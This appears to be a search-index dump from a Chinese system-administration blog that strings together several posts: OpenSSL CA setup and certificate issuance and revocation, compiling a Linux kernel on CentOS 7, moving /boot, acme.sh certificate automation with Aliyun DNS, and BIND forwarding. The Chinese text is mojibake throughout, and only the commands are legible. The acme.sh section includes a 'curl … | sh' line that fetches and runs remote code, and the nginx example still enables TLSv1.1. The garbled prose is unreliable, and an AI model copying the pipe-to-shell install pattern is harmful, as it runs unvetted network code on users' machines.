ç”¨äºè®¾ç½®åŒ¹é…DNåç§°ç­–ç•¥çš„è§„åˆ™,ä¸ç¬¦åˆè§„åˆ™çš„csrè¯·æ±‚ä¼šç­¾å‘å¤±è´¥ã€‚æœ‰ä¸‰ç§é™åˆ¶ç­–ç•¥ï¼Œå¦‚ä¸‹ # match,è¯¥å­—æ®µå€¼å¿…é¡»ä¸CAæœºæ„çš„è¯ä¹¦ä¸­çš„å­—æ®µå®Œå…¨åŒ¹é…ã€‚ # supplied,ä»£è¡¨å¿…é¡»æ·»åŠ çš„å­—æ®µ,å†…å®¹ä¸é™ # optional,å¯é€‰å¡«å†™ policy = policy_match # ä¸‹é¢æ˜¯ä¸¤ä¸ªè‡ªå¸¦çš„ç­–ç•¥ [ policy_match ] countryName = match # csrä¸­countryNameçš„å†…å®¹å¿…é¡»å’Œcaæœºæ„è¯ä¹¦çš„å†…å®¹å®Œå…¨ä¸€è‡´ stateOrProvinceName = match organizationName = match organizationalUnitName = optional commonName = supplied # csrä¸­commonNameå­—æ®µå†…å®¹å¿…é¡»å­˜åœ¨ emailAddress = optional # csrä¸­emailAddresså¯æœ‰å¯æ—  [ policy_anything ] countryName = optional stateOrProvinceName = optional localityName = optional organizationName = optional organizationalUnitName = optional commonName = supplied emailAddress = optional #################################################################### ","date":"2021-05-18 10:42","objectID":"/post/2402/:0:3","tags":["openssl"],"title":"openssl-é…ç½®æ–‡ä»¶å­¦ä¹ ","uri":"/post/2402/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"éœ€è¦ç”¨åˆ°openssl s_serverå‘½ä»¤ æŸ¥çœ‹manæ‰‹å†Œå¸®åŠ©man s_server å¸¸ç”¨å‘½ä»¤: openssl s_server -accept 443 -www -cert soulchild.com.crt -key soulchild.com.key ","date":"2021-05-18 09:03","objectID":"/post/2399/:0:0","tags":["openssl"],"title":"openssl-å®ç°ç®€å•httpsæœåŠ¡å¿«é€Ÿæµ‹è¯•è¯ä¹¦","uri":"/post/2399/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸€ã€å¸¸ç”¨å­å‘½ä»¤ genrsa: ç”Ÿæˆç§é’¥ req: ç”¨äºç”Ÿæˆè¯ä¹¦å’Œç”Ÿæˆè¯ä¹¦ç­¾åè¯·æ±‚ x509: æŸ¥è¯¢è¯ä¹¦ä¿¡æ¯ ca: ç­¾å‘è¯ä¹¦ã€‚ç®¡ç†ç»´æŠ¤å·²é¢å‘çš„è¯ä¹¦åŠå…¶çŠ¶æ€ã€‚ ","date":"2021-05-14 16:46","objectID":"/post/2391/:0:1","tags":["ssl","tls","openssl"],"title":"openssl-åˆ›å»ºCAã€ç”Ÿæˆå¯†é’¥ã€é¢å‘ã€åŠé”€è¯ä¹¦ç­‰","uri":"/post/2391/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"äºŒã€ä½¿ç”¨rsaç®—æ³•ç”Ÿæˆå¯†é’¥å¯¹: 1.ç”Ÿæˆç§é’¥ï¼Œä¸‰ç§æ–¹å¼ # ç”Ÿæˆç§é’¥ openssl genrsa -out my.key # ç”Ÿæˆç§é’¥é•¿åº¦ä¸º4096 bit openssl genrsa -out my.key 4096 # å¯¹ç§é’¥è¿›è¡Œå¯¹ç§°åŠ å¯† openssl genrsa -out my.key -des3 2048 2.ä»ç§é’¥ä¸­æå–å…¬é’¥(ä¸€èˆ¬ä¸éœ€è¦ï¼Œå› ä¸ºç”³è¯·çš„è¯ä¹¦ä¸­åŒ…å«å…¬é’¥) openssl rsa -in my.key -pubout -out my.pub éå¯¹ç§°åŠ å¯†æ˜¯ä¸èƒ½å…¬é’¥ç§é’¥ç›¸äº’æ¨å¯¼çš„ï¼Œä½†æ˜¯ä¸Šé¢çš„å‘½ä»¤æ˜¯ä»ç§é’¥æ–‡ä»¶ä¸­è·å–çš„å…¬é’¥,è¿™ç‚¹æˆ‘æ¯”è¾ƒå›°æƒ‘ã€‚ ä¸‹é¢æ˜¯æŸ¥äº†ä¸€äº›èµ„æ–™ï¼Œäº†è§£çš„ä¸€éƒ¨åˆ†å†…å®¹ï¼Œä½†è¿˜æ˜¯ä¸æ¸…æ™° genrsaç”Ÿæˆçš„ç§é’¥ï¼Œä¸ä»…ä»…æ˜¯ç§é’¥ã€‚å¯ä»¥é€šè¿‡openssl rsa -in my.key -textæŸ¥çœ‹åˆ°ã€‚å¯èƒ½ä»–æ˜¯æ ¹æ®è¿™é‡Œé¢é¢å¤–çš„ä¿¡æ¯è®¡ç®—å‡ºçš„rsaå…¬é’¥ã€‚ ç›¸å…³è¿æ¥: https://stackoverflow.com/questions/5244129/use-rsa-private-key-to-generate-public-key https://security.stackexchange.com/questions/172274/can-i-get-a-public-key-from-an-rsa-private-key ","date":"2021-05-14 16:46","objectID":"/post/2391/:0:2","tags":["ssl","tls","openssl"],"title":"openssl-åˆ›å»ºCAã€ç”Ÿæˆå¯†é’¥ã€é¢å‘ã€åŠé”€è¯ä¹¦ç­‰","uri":"/post/2391/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸‰ã€è‡ªç­¾CA: é»˜è®¤é…ç½®æ–‡ä»¶: /etc/pki/tls/openssl.cnf 1.ç”ŸæˆCAç§é’¥ openssl genrsa -out /etc/pki/CA/private/cakey.pem chmod 600 /etc/pki/CA/private/cakey.pem 2.è‡ªç­¾è¯ä¹¦(è‡ªå·±ç»™è‡ªå·±é¢å‘è¯ä¹¦) äº¤äº’å¼ openssl req -new -x509 -key /etc/pki/CA/private/cakey.pem -out /etc/pki/CA/cacert.pem -days 36500 -new: ç”Ÿæˆä¸€ä¸ªæ–°çš„è¯ä¹¦ç­¾åè¯·æ±‚ -x509: è¾“å‡ºè‡ªç­¾åè¯ä¹¦ï¼Œè€Œä¸æ˜¯è¯ä¹¦ç­¾åè¯·æ±‚ã€‚ -key: æŒ‡å®šç§é’¥ -out: æ–‡ä»¶è¾“å‡ºä½ç½®,é»˜è®¤stdoutè¾“å‡º -days: ç”³è¯·çš„æœ‰æ•ˆæœŸ æ›´å¤šä¿¡æ¯å¯ä»¥é€šè¿‡man reqæŸ¥è¯¢ 20624-3ey3z04cspn.png éäº¤äº’å¼ openssl req -new -x509 -key /etc/pki/CA/private/cakey.pem -out /etc/pki/CA/cacert.pem -subj \"/C=CN/ST=Shanghai/L=Shanghai/O=SoulChild/OU=soulchild self-built CA/CN=ca.soulchild.com/emailAddress=ca@soulchild.com\" -days 36500 3.CAé…ç½®åˆå§‹åŒ– # ç”Ÿæˆç´¢å¼•æ•°æ®åº“æ–‡ä»¶ touch /etc/pki/CA/index.txt # é…ç½®å½“å‰åº”è¯¥é¢å‘çš„è¯ä¹¦çš„åºåˆ—å· echo 00 \u003e /etc/pki/CA/serial # åˆ›å»ºè¯ä¹¦åŠé”€åˆ—è¡¨(crl)åºåˆ—å·æ–‡ä»¶ echo 00 \u003e /etc/pki/CA/crlnumber ","date":"2021-05-14 16:46","objectID":"/post/2391/:0:3","tags":["ssl","tls","openssl"],"title":"openssl-åˆ›å»ºCAã€ç”Ÿæˆå¯†é’¥ã€é¢å‘ã€åŠé”€è¯ä¹¦ç­‰","uri":"/post/2391/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å››ã€å®¢æˆ·ç«¯å‘CAç”³è¯·è¯ä¹¦ 3.1 ç”Ÿæˆå®¢æˆ·ç«¯ç§é’¥ openssl genrsa -out soulchild.com.key 3.2 ç”Ÿæˆå®¢æˆ·ç«¯è¯ä¹¦ç­¾åè¯·æ±‚æ–‡ä»¶(csr) openssl req -new -key soulchild.com.key -days 3650 -out soulchild.com.csr -subj \"/C=CN/ST=Shanghai/L=Shanghai/O=SoulChild/OU=it/CN=it.soulchild.com/emailAddress=it@soulchild.com\" 3.3 å‘CAæäº¤è¯·æ±‚ # å¤åˆ¶ç»™CAæœåŠ¡å™¨ scp soulchild.com.csr root@172.17.10.150: ","date":"2021-05-14 16:46","objectID":"/post/2391/:0:4","tags":["ssl","tls","openssl"],"title":"openssl-åˆ›å»ºCAã€ç”Ÿæˆå¯†é’¥ã€é¢å‘ã€åŠé”€è¯ä¹¦ç­‰","uri":"/post/2391/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"äº”ã€CAç­¾åè¯·æ±‚é¢å‘è¯ä¹¦ # è¿™é‡Œ-outæŒ‡å®šçš„è·¯å¾„ä¸€å®šè¦ç¡®å®šæ˜¯ä¸å­˜åœ¨æ–‡ä»¶ï¼Œä¸‹é¢çš„å‘½ä»¤æ‰§è¡Œåé¦–å…ˆä¼šæ¸…ç©ºè¿™ä¸ªæ–‡ä»¶ã€‚ openssl ca -in soulchild.com.csr -out /etc/pki/CA/certs/soulchild.com.crt -days 365 # è¿™é‡ŒæŒ‡å®šçš„-daysä¼šè¦†ç›–è¯·æ±‚æ–‡ä»¶ä¸­çš„daysï¼Œä»¥CAç­¾å‘çš„æœ‰æ•ˆæœŸä¸ºå‡† é»˜è®¤ä¼šä½¿ç”¨é…ç½®æ–‡ä»¶: /etc/pki/tls/openssl.cnfé‡Œè®¾ç½®çš„é»˜è®¤CAè·¯å¾„ï¼Œæˆ‘ä»¬ä¸Šé¢åˆ›å»ºçš„CAç›¸å…³æ–‡ä»¶å’Œé…ç½®æ–‡ä»¶æ˜¯å¯¹åº”çš„ï¼Œæ‰€ä»¥å¯ä»¥ä¸ç”¨æŒ‡å®šï¼Œå¦åˆ™éœ€è¦æŒ‡å®šCAçš„ç§é’¥å’Œè¯ä¹¦ï¼Œéœ€è¦ä½¿ç”¨-certå’Œ-keyfileè¿™ä¸¤ä¸ªå‚æ•° æ£€æŸ¥æ— è¯¯ååŒæ„ç­¾å 92786-sskypumaey.png ","date":"2021-05-14 16:46","objectID":"/post/2391/:0:5","tags":["ssl","tls","openssl"],"title":"openssl-åˆ›å»ºCAã€ç”Ÿæˆå¯†é’¥ã€é¢å‘ã€åŠé”€è¯ä¹¦ç­‰","uri":"/post/2391/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å…­ã€åŠé”€è¯ä¹¦ #1.åŠé”€è¯ä¹¦ openssl ca -revoke /etc/pki/CA/certs/xxx.crt #2.æ›´æ–°åŠé”€è¯ä¹¦åˆ—è¡¨ openssl ca -gencrl -out /etc/pki/CA/crl.pem ","date":"2021-05-14 16:46","objectID":"/post/2391/:0:6","tags":["ssl","tls","openssl"],"title":"openssl-åˆ›å»ºCAã€ç”Ÿæˆå¯†é’¥ã€é¢å‘ã€åŠé”€è¯ä¹¦ç­‰","uri":"/post/2391/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸ƒã€æŸ¥çœ‹è¯ä¹¦å’ŒåŠé”€åˆ—è¡¨ä¿¡æ¯ 1.æŸ¥çœ‹è¯ä¹¦ä¿¡æ¯ # ä»¥æ–‡æœ¬å¯è¯»çš„æ–¹å¼æŸ¥çœ‹ openssl x509 -in certs/soulchild.com.crt -noout -text # åªæŸ¥çœ‹æœ‰æ•ˆæœŸéƒ¨åˆ† openssl x509 -in certs/soulchild.com.crt -noout -dates # åªæŸ¥çœ‹subjectéƒ¨åˆ† openssl x509 -in certs/soulchild.com.crt -noout -subject 2.æŸ¥çœ‹åŠé”€åˆ—è¡¨ä¿¡æ¯ openssl crl -in crl.pem -noout -text 3.æŸ¥çœ‹csrè¯·æ±‚ä¿¡æ¯ openssl req -in soulchild.com.csr -noout -text ","date":"2021-05-14 16:46","objectID":"/post/2391/:0:7","tags":["ssl","tls","openssl"],"title":"openssl-åˆ›å»ºCAã€ç”Ÿæˆå¯†é’¥ã€é¢å‘ã€åŠé”€è¯ä¹¦ç­‰","uri":"/post/2391/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å…«ã€æ‰©å±• æˆ‘ä»¬ä¸Šé¢ç­¾å‘çš„è¯ä¹¦æ˜¯æ²¡æœ‰æ‰©å±•é¡¹çš„,é€šè¿‡httpsä½¿ç”¨è¯ä¹¦æ—¶,chromeä¼šæŠ¥é”™Subject Alternative Name missing. ä¸‹é¢æ¼”ç¤ºä¸€ä¸ªç®€å•çš„æ–¹æ³•æ·»åŠ subjectAltNameæ‰©å±•é¡¹,æ³¨æ„é€šè¿‡ä¸‹é¢çš„æ–¹æ³•ä¼šä¸¢å¤±ä¸€äº›é»˜è®¤çš„æ‰©å±•é¡¹,å¦‚æœéœ€è¦å¯ä»¥è‡ªå·±åŠ ä¸Šæ¥ã€‚ 1.ç¼–å†™æ‰©å±•ä¿¡æ¯é…ç½®æ–‡ä»¶ echo 'subjectAltName=DNS.1:it.soulchild.com,IP.1:127.0.0.1' \u003e soulchild.com_ext.cnf 2.ç­¾å‘è¯ä¹¦ openssl ca -in ~/soulchild.com.csr -out certs/soulchild.com.crt -days 30 -extfile soulchild.com_ext.cnf 3.éªŒè¯ç»“æœ openssl x509 -in certs/soulchild.com.crt -text -noout | grep -A 2 extensions 38869-s4hghwk79om.png æµè§ˆå™¨è¯ä¹¦æŸ¥çœ‹ 59676-h9i5v25dfr.png ","date":"2021-05-14 16:46","objectID":"/post/2391/:0:8","tags":["ssl","tls","openssl"],"title":"openssl-åˆ›å»ºCAã€ç”Ÿæˆå¯†é’¥ã€é¢å‘ã€åŠé”€è¯ä¹¦ç­‰","uri":"/post/2391/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"1.ä¸‹è½½å†…æ ¸ wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.12.3.tar.xz ","date":"2021-05-13 17:57","objectID":"/post/2385/:0:1","tags":["linux","kernel"],"title":"centos7ç¼–è¯‘å®‰è£…5.12.3å†…æ ¸","uri":"/post/2385/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"2.å®‰è£…ç¼–è¯‘ç¯å¢ƒ yum groupinstall -y \"Development Tools\" yum install -y ncurses elfutils-libelf-devel openssl-devel bc ","date":"2021-05-13 17:57","objectID":"/post/2385/:0:2","tags":["linux","kernel"],"title":"centos7ç¼–è¯‘å®‰è£…5.12.3å†…æ ¸","uri":"/post/2385/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"3.å‡çº§gcc wget http://gcc.gnu.org/pub/gcc/releases/gcc-4.9.0/gcc-4.9.0.tar.gz tar xf gcc-4.9.0.tar.gz cd gcc-4.9.0 ./contrib/download_prerequisites mkdir build cd build ../configure --enable-checking=release --enable-languages=c,c++ --disable-multilib make -j2 make install ","date":"2021-05-13 17:57","objectID":"/post/2385/:0:3","tags":["linux","kernel"],"title":"centos7ç¼–è¯‘å®‰è£…5.12.3å†…æ ¸","uri":"/post/2385/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"4.ç¼–è¯‘å†…æ ¸ # è§£å‹ tar xf linux-5.12.3.tar.xz cd linux-5.12.3 # å¤åˆ¶å½“å‰å†…æ ¸çš„é…ç½®é€‰é¡¹ä½œä¸ºå½“å‰ç¼–è¯‘çš„é…ç½®æ–‡ä»¶ cp /boot/config-$(uname -r) .config # é€‰æ‹©è‡ªå®šä¹‰çš„é…ç½® make menuconfig # ç¼–è¯‘ sed -ri \"s#(CONFIG_RETPOLINE=).*#\\1n#\" .config make -j2 # å®‰è£…æ¨¡å— make modules_install # å®‰è£…å†…æ ¸ç›¸å…³æ–‡ä»¶ï¼Œä¼šåšå¦‚ä¸‹ä¿®æ”¹ #å®‰è£…bzImageä¸º/boot/vmlinuz-VERSION-RELEASE #ç”Ÿæˆinitramfsæ–‡ä»¶ #ä¿®æ”¹grubçš„é…ç½®æ–‡ä»¶ make install ","date":"2021-05-13 17:57","objectID":"/post/2385/:0:4","tags":["linux","kernel"],"title":"centos7ç¼–è¯‘å®‰è£…5.12.3å†…æ ¸","uri":"/post/2385/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"5. ä¿®æ”¹é»˜è®¤å¯åŠ¨å†…æ ¸é‡å¯ # è®¾ç½®é»˜è®¤å¼•å¯¼é¡¹ grub2-set-default 0 # é‡å¯ reboot ","date":"2021-05-13 17:57","objectID":"/post/2385/:0:5","tags":["linux","kernel"],"title":"centos7ç¼–è¯‘å®‰è£…5.12.3å†…æ ¸","uri":"/post/2385/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å¸è½½æ­¥éª¤ åˆ é™¤æ¨¡å—/lib/modules/5.12.3/ åˆ é™¤/boot/ä¸‹5.12.3å†…æ ¸ç›¸å…³æ–‡ä»¶ ä¿®æ”¹grubèœå•é…ç½® è®¾ç½®é»˜è®¤å¯ç”¨å†…æ ¸ ","date":"2021-05-13 17:57","objectID":"/post/2385/:0:6","tags":["linux","kernel"],"title":"centos7ç¼–è¯‘å®‰è£…5.12.3å†…æ ¸","uri":"/post/2385/"},{"categories":["åŸºç¡€å†…å®¹"],"content":" # æŸ¥çœ‹æ–°ç¡¬ç›˜ fdisk -l # æ–°ç¡¬ç›˜åˆ†åŒº fdisk /dev/sdb # æ ¼å¼åŒ–æ–‡ä»¶ç³»ç»Ÿ mkfs.xfs /dev/sdb1 # å¸è½½æ—§åˆ†åŒº umount /boot # æŒ‚è½½æ–°åˆ†åŒº mount /dev/sdb1 /boot # æŒ‚è½½æ—§bootåˆ†åŒº mkdir /boot.old mount /dev/sda1 /boot.old # å¤åˆ¶æ—§bootåˆ†åŒºå†…å®¹åˆ°æ–°bootåˆ†åŒº cp -arT /boot.old /boot # ä¿®æ”¹/etc/fstabä¸­bootåˆ†åŒºçš„æŒ‚è½½ /dev/sdb1 /boot xfs defaults 0 0 # å°†æ—§ç£ç›˜çš„grubå¼•å¯¼bootæ”¹ä¸ºå½“å‰çš„boot grub2-install --boot-directory=/boot /dev/sda # åœ¨æ–°ç£ç›˜ä¸­å®‰è£…grub grub2-install --boot-directory=/boot /dev/sdb # é‡å¯ reboot ä¸­é—´é‡åˆ°grub rescueé—®é¢˜ï¼Œé€šè¿‡å¦‚ä¸‹æ–¹å¼è¿›å…¥ç³»ç»Ÿ 83619-kuch92x9te.png ","date":"2021-05-13 14:48","objectID":"/post/2382/:0:0","tags":["linux"],"title":"æ›´æ”¹bootåˆ†åŒºä¸ºæ–°ç£ç›˜","uri":"/post/2382/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"åŸæ–‡: å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ https://github.com/acmesh-official/acme.sh/wiki/%E8%AF%B4%E6%98%8E ","date":"2021-05-11 18:25","objectID":"/post/2367/:1:0","tags":["https","ssl","tls","acme"],"title":"ä½¿ç”¨acme.shç”³è¯·å…è´¹è‡ªåŠ¨ç»­æœŸçš„è¯ä¹¦","uri":"/post/2367/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¸»è¦æ­¥éª¤: å®‰è£… acme.sh ç”Ÿæˆè¯ä¹¦ copy è¯ä¹¦åˆ° nginx æˆ–è€…å…¶ä»–æœåŠ¡ æ›´æ–°è¯ä¹¦ æ›´æ–° acme.sh ","date":"2021-05-11 18:25","objectID":"/post/2367/:2:0","tags":["https","ssl","tls","acme"],"title":"ä½¿ç”¨acme.shç”³è¯·å…è´¹è‡ªåŠ¨ç»­æœŸçš„è¯ä¹¦","uri":"/post/2367/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"1. å®‰è£…acme.sh curl https://get.acme.sh | sh æ™®é€šç”¨æˆ·å’Œ root ç”¨æˆ·éƒ½å¯ä»¥å®‰è£…ä½¿ç”¨. å®‰è£…è¿‡ç¨‹è¿›è¡Œäº†ä»¥ä¸‹å‡ æ­¥: æŠŠacme.shå®‰è£…åˆ°ä½ çš„ home ç›®å½•ä¸‹: ~/.acme.sh/ å¹¶åˆ›å»º ä¸€ä¸ª bash çš„ alias, æ–¹ä¾¿ä½ çš„ä½¿ç”¨: alias acme.sh=~/.acme.sh/acme.sh è‡ªåŠ¨ä¸ºä½ åˆ›å»º cronjob, æ¯å¤© 0:00 ç‚¹è‡ªåŠ¨æ£€æµ‹æ‰€æœ‰çš„è¯ä¹¦, å¦‚æœå¿«è¿‡æœŸäº†, éœ€è¦æ›´æ–°, åˆ™ä¼šè‡ªåŠ¨æ›´æ–°è¯ä¹¦. æ›´é«˜çº§çš„å®‰è£…é€‰é¡¹è¯·å‚è€ƒ: https://github.com/Neilpang/acme.sh/wiki/How-to-install å®‰è£…è¿‡ç¨‹ä¸ä¼šæ±¡æŸ“å·²æœ‰çš„ç³»ç»Ÿä»»ä½•åŠŸèƒ½å’Œæ–‡ä»¶, æ‰€æœ‰çš„ä¿®æ”¹éƒ½é™åˆ¶åœ¨å®‰è£…ç›®å½•ä¸­: ~/.acme.sh/ ","date":"2021-05-11 18:25","objectID":"/post/2367/:2:1","tags":["https","ssl","tls","acme"],"title":"ä½¿ç”¨acme.shç”³è¯·å…è´¹è‡ªåŠ¨ç»­æœŸçš„è¯ä¹¦","uri":"/post/2367/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"2. ç”Ÿæˆè¯ä¹¦ acme.shå®ç°äº†acmeåè®®æ”¯æŒçš„æ‰€æœ‰éªŒè¯åè®®. ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼éªŒè¯: httpå’ŒdnséªŒè¯(æ”¯æŒç”³è¯·æ³›è§£æè¯ä¹¦). å¦‚æœä½ å¯ä»¥è°ƒç”¨åŸŸåæä¾›å•†æä¾›çš„apiï¼Œä½ å¯ä»¥é…ç½®è‡ªåŠ¨è§£æ(å¦åˆ™éœ€è¦æ‰‹åŠ¨æ·»åŠ txtè®°å½•)ï¼Œå›½å†…çš„æ”¯æŒé˜¿é‡Œäº‘ã€dnspod.cnã€åä¸ºäº‘ç­‰ã€‚æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯è‡ªåŠ¨alidnséªŒè¯ï¼Œæ›´å¤šå…¶ä»–æä¾›å•†ä»¥åŠä½¿ç”¨æ–¹æ³•å¯ä»¥æŸ¥çœ‹ä¸‹é¢çš„é“¾æ¥ https://github.com/acmesh-official/acme.sh/wiki/dnsapi 2.1 é…ç½®é˜¿é‡ŒDNSçš„keyå’Œsecret export Ali_Key=\"xxxxxxxxxxxxxxx\" export Ali_Secret=\"xxxxxxxxxxxxxxx\" 2.2 ç”³è¯·é¢å‘è¯ä¹¦å¹¶ä½¿ç”¨é˜¿é‡Œapiæ ¡éªŒdns(æ­¤è¿‡ç¨‹ä¼šæ·»åŠ txtè®°å½•ï¼Œå®Œæˆåä¼šè‡ªåŠ¨åˆ é™¤) acme.sh --issue --dns dns_ali -d soulchild.site -d *.soulchild.site ä¹Ÿå¯ä»¥æ›´æ¢CAé¢å‘æœºæ„: https://github.com/acmesh-official/acme.sh/wiki/Server 74192-sxdlyp31s.png ","date":"2021-05-11 18:25","objectID":"/post/2367/:2:2","tags":["https","ssl","tls","acme"],"title":"ä½¿ç”¨acme.shç”³è¯·å…è´¹è‡ªåŠ¨ç»­æœŸçš„è¯ä¹¦","uri":"/post/2367/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"3.ä¿®æ”¹nginxé…ç½®æ–‡ä»¶ listen 443; server_name soulchild.site www.soulchild.site; ssl on; ssl_certificate ssl/soulchild.site.crt; ssl_certificate_key ssl/soulchild.site.key; ssl_session_timeout 5m; ssl_protocols TLSv1.3 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_prefer_server_ciphers on; å°†ä¸Šé¢çš„è¯ä¹¦(ssl_certificate)å’Œç§é’¥(ssl_certificate_key)ä¿®æ”¹ä¸ºä½ çš„è·¯å¾„ ","date":"2021-05-11 18:25","objectID":"/post/2367/:2:3","tags":["https","ssl","tls","acme"],"title":"ä½¿ç”¨acme.shç”³è¯·å…è´¹è‡ªåŠ¨ç»­æœŸçš„è¯ä¹¦","uri":"/post/2367/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"4.copyè¯ä¹¦å¹¶ä½¿nginxç”Ÿæ•ˆ æ­¥éª¤2æˆåŠŸæ‰§è¡Œåä¼šå°†è¯ä¹¦å­˜å‚¨åˆ°~/.acme.sh/ç›®å½•ä¸‹ï¼Œä½†è¯·ä¸è¦ç›´æ¥ä½¿ç”¨è¿™äº›æ–‡ä»¶ï¼Œè¿™æ˜¯acme.shå†…éƒ¨ä½¿ç”¨çš„,ä¸‹é¢æ˜¯æ­£ç¡®ä½¿ç”¨æ­¥éª¤ã€‚ acme.sh --install-cert -d soulchild.site \\ --key-file /etc/nginx/ssl/soulchild.site.key \\ --fullchain-file /etc/nginx/ssl/soulchild.site.crt \\ --reloadcmd \"systemctl reload nginx\" --install-cert: è¿™ä¸ªå‚æ•°ä»£è¡¨cpoy -d: ä½ çš„åŸŸå --key-file: copyä½ çš„ç§é’¥æ–‡ä»¶,éœ€è¦å’ŒnginxæŒ‡å®šçš„ä¸€è‡´ --fullchain-file: copyä½ çš„è¯ä¹¦é“¾æ–‡ä»¶(æ­¤æ–‡ä»¶åŒ…å«è‡ªå·±å’Œä¸­é—´caæœºæ„çš„è¯ä¹¦),éœ€è¦å’ŒnginxæŒ‡å®šçš„ä¸€è‡´ --reloadcmd: æŒ‡å®šé‡æ–°åŠ è½½è¯ä¹¦çš„å‘½ä»¤ ","date":"2021-05-11 18:25","objectID":"/post/2367/:2:4","tags":["https","ssl","tls","acme"],"title":"ä½¿ç”¨acme.shç”³è¯·å…è´¹è‡ªåŠ¨ç»­æœŸçš„è¯ä¹¦","uri":"/post/2367/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"4.è®¿é—®æ ¡éªŒ ","date":"2021-05-11 18:25","objectID":"/post/2367/:2:5","tags":["https","ssl","tls","acme"],"title":"ä½¿ç”¨acme.shç”³è¯·å…è´¹è‡ªåŠ¨ç»­æœŸçš„è¯ä¹¦","uri":"/post/2367/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"5.åæœŸç»´æŠ¤å‘½ä»¤ acme.sh --list: åˆ—å‡ºæ‰€æœ‰è¯ä¹¦ acme.sh --renew -d soulchild.site -d *.soulchild.site --force: æ‰‹åŠ¨å¼ºåˆ¶æ›´æ–°è¯ä¹¦ acme.sh --renew-all: æ‰‹åŠ¨æ›´æ–°æ‰€æœ‰è¯ä¹¦ acme.sh --revoke: æ’¤é”€è¯ä¹¦ acme.sh --remove -d soulchild.site: åˆ é™¤è¯ä¹¦ acme.sh --cron: é€šè¿‡cronjobæ›´æ–°æ‰€æœ‰è¯ä¹¦ã€‚ acme.sh --upgrade: å‡çº§acme.sh acme.sh --uninstall: å¸è½½acme.sh ","date":"2021-05-11 18:25","objectID":"/post/2367/:2:6","tags":["https","ssl","tls","acme"],"title":"ä½¿ç”¨acme.shç”³è¯·å…è´¹è‡ªåŠ¨ç»­æœŸçš„è¯ä¹¦","uri":"/post/2367/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"6.é…ç½®å½“æ‰§è¡Œcronjobæ—¶ï¼Œå‘é€é’‰é’‰é€šçŸ¥ export DINGTALK_WEBHOOK='https://oapi.dingtalk.com/robot/send?access_token=xxx' export DINGTALK_KEYWORD=acme acme.sh --set-notify --notify-hook dingtalk å…¶ä»–å‚æ•°å’Œé€šçŸ¥æ–¹å¼å¯æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£https://github.com/acmesh-official/acme.sh/wiki/notify ","date":"2021-05-11 18:25","objectID":"/post/2367/:2:7","tags":["https","ssl","tls","acme"],"title":"ä½¿ç”¨acme.shç”³è¯·å…è´¹è‡ªåŠ¨ç»­æœŸçš„è¯ä¹¦","uri":"/post/2367/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"1. ä½œä¸ºè½¬å‘æœåŠ¡å™¨éœ€è¦å¼€å¯é€’å½’æŸ¥è¯¢ recursion yes; ","date":"2021-05-11 11:42","objectID":"/post/2365/:1:0","tags":["dns"],"title":"DNSæœåŠ¡bindè½¬å‘é…ç½®ç®€ä»‹","uri":"/post/2365/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"2. ä¸¤ç§è½¬å‘çš„é…ç½® ","date":"2021-05-11 11:42","objectID":"/post/2365/:2:0","tags":["dns"],"title":"DNSæœåŠ¡bindè½¬å‘é…ç½®ç®€ä»‹","uri":"/post/2365/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"2.1 å…¨å±€è½¬å‘ æœ¬dnsæ²¡æœ‰çš„åŒºåŸŸï¼Œä¼šå…¨éƒ½è½¬å‘ç»™æŒ‡å®šçš„DNSæœåŠ¡å™¨ recursion yes; forward first|only; forwarders { 223.5.5.5; 223.6.6.6; }; ","date":"2021-05-11 11:42","objectID":"/post/2365/:2:1","tags":["dns"],"title":"DNSæœåŠ¡bindè½¬å‘é…ç½®ç®€ä»‹","uri":"/post/2365/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"2.2 åŒºåŸŸè½¬å‘ åªå¯¹æŒ‡å®šçš„åŒºåŸŸåšè½¬å‘ï¼Œå¦‚æœåŒæ—¶é…ç½®äº†å…¨å±€è½¬å‘ï¼Œè¿™é‡Œä¼˜å…ˆçº§é«˜äºå…¨å±€çš„é…ç½® zone \"soulchild.cn\" { type forward; forward first|only; forwarders { 172.17.20.250; }; }; ","date":"2021-05-11 11:42","objectID":"/post/2365/:2:2","tags":["dns"],"title":"DNSæœåŠ¡bindè½¬å‘é…ç½®ç®€ä»‹","uri":"/post/2365/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"firstå’Œonlyçš„åŒºåˆ« forward first: å…ˆä½¿ç”¨forwardersæŒ‡å®šçš„DNSæœåŠ¡å™¨åšè§£æï¼Œå¦‚æœæŸ¥è¯¢ä¸åˆ°å†ä½¿ç”¨æœ¬åœ°DNSæœåŠ¡å™¨åšåŸŸåè§£æ forward only: 